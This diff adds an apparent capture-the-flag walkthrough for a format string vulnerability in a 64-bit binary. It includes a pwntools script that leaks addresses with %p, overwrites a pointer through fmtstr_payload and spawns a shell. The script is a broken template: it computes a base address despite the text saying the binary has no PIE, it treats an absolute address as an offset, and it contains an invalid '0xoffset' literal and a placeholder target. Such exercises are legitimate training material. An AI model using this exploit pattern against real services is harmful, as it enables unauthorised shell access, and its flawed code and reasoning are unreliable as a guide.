@@ -1,0 +1,112 @@
+To solve this challenge using `pwntools`, we need to analyze the binary and identify the vulnerability. Based on the provided information, the challenge has a format string vulnerability in the `sub_400B07` function. This function uses `printf` with user-controlled input (`format`), which can be exploited to leak memory or overwrite values in memory.
+
+Here are the steps to solve the challenge:
+
+---
+
+### **Steps to Solve the Challenge**
+
+1. **Analyze the Binary**:
+   - The binary is a 64-bit ELF file with no PIE (Position Independent Executable), meaning the binary's base address is fixed.
+   - There is no stack canary, so buffer overflows are easier to exploit.
+   - NX (Non-Executable Stack) is enabled, so we cannot execute shellcode on the stack.
+
+2. **Identify the Vulnerability**:
+   - The `sub_400B07` function has a format string vulnerability because it directly passes user input to `printf` without proper formatting.
+   - This allows us to use `%p` or `%x` to leak memory addresses or `%n` to write to memory.
+
+3. **Plan the Exploit**:
+   - Use the format string vulnerability to leak the address of `sub_4008A6` (the `system("/bin/sh")` function) or other useful addresses.
+   - Use the leaked address to calculate offsets and overwrite the return address or function pointers to redirect execution to `sub_4008A6`.
+
+4. **Write the Exploit**:
+   - Use `pwntools` to interact with the binary.
+   - Leak memory addresses using the format string vulnerability.
+   - Calculate the address of `sub_4008A6` and overwrite a function pointer or return address to execute it.
+
+---
+
+### **Exploit Code**
+
+Here is the Python exploit script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up pwntools for the target binary
+binary = './fmt'
+elf = ELF(binary)
+context.binary = binary
+
+# Start the process or connect to the remote server
+# p = process(binary)  # For local testing
+p = remote('challenge.server.com', 1337)  # Replace with actual host and port
+
+# Step 1: Leak memory addresses using the format string vulnerability
+p.recvuntil(b"1.Sh0w Account Infomation!\n")
+p.sendline(b"1")  # Choose option 1 to trigger the format string vulnerability
+
+# Send a payload to leak memory addresses
+payload = b"%p " * 10  # Adjust the number of %p to leak enough addresses
+p.sendline(payload)
+
+# Receive and parse the leaked addresses
+leaked_data = p.recvline().decode().strip().split()
+log.info(f"Leaked data: {leaked_data}")
+
+# Step 2: Calculate the address of `sub_4008A6` (system("/bin/sh"))
+# Use the leaked addresses to calculate the base address of the binary
+binary_base = int(leaked_data[0], 16) - 0xoffset  # Replace 0xoffset with the actual offset
+log.info(f"Binary base address: {hex(binary_base)}")
+
+# Calculate the address of `sub_4008A6`
+system_addr = binary_base + 0x8A6  # Replace 0x8A6 with the actual offset of sub_4008A6
+log.info(f"Address of system('/bin/sh'): {hex(system_addr)}")
+
+# Step 3: Overwrite a function pointer or return address
+# Use the format string vulnerability to overwrite a function pointer or return address
+p.recvuntil(b"2.Ed1t Account Inf0mation!\n")
+p.sendline(b"2")  # Choose option 2 to edit account information
+
+# Construct the payload to overwrite a function pointer
+# Replace 0xdeadbeef with the address to overwrite and adjust the payload as needed
+payload = fmtstr_payload(offset=6, writes={0xdeadbeef: system_addr})
+p.sendline(payload)
+
+# Step 4: Trigger the overwritten function pointer
+p.recvuntil(b"3.QUit sangebaimao:(\n")
+p.sendline(b"3")  # Choose option 3 to quit and trigger the overwritten pointer
+
+# Step 5: Get a shell
+p.interactive()
+```
+
+---
+
+### **Explanation of the Code**
+
+1. **Leaking Memory**:
+   - The format string vulnerability is used to leak memory addresses by sending `%p` multiple times.
+   - The leaked addresses are parsed to calculate the base address of the binary.
+
+2. **Calculating Offsets**:
+   - Using the leaked addresses, the base address of the binary is calculated.
+   - The address of `sub_4008A6` (the `system("/bin/sh")` function) is calculated using its offset from the base address.
+
+3. **Overwriting Memory**:
+   - The `fmtstr_payload` function from `pwntools` is used to construct a payload that overwrites a function pointer or return address with the address of `sub_4008A6`.
+
+4. **Triggering the Exploit**:
+   - The overwritten function pointer is triggered by choosing the appropriate menu option, leading to the execution of `system("/bin/sh")`.
+
+5. **Getting a Shell**:
+   - Once the exploit is successful, an interactive shell is opened.
+
+---
+
+### **Notes**
+- Replace `0xoffset` and `0xdeadbeef` with the actual offsets and addresses based on your analysis of the binary.
+- If the challenge is remote, ensure you handle network latency and adjust the script accordingly.
+- Test the exploit locally before using it on the remote server.
+
+Good luck with the challenge!
